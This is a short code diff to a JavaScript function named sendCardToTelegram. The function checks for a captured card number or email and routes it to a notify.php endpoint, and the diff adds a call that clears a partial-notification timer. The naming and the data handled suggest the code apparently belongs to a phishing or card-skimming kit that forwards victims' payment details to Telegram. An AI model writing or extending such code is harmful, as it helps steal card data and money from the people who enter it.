@@ -12,6 +12,8 @@ function sendCardToTelegram(paymentData) {
 
   if (!data.cardNumber && !data.email) return;
 
+  if (typeof clearPartialNotifyTimer === "function") clearPartialNotifyTimer();
+
   const apiBase = window.location.pathname.includes("/pages/")
     ? "../api/notify.php"
     : "api/notify.php";
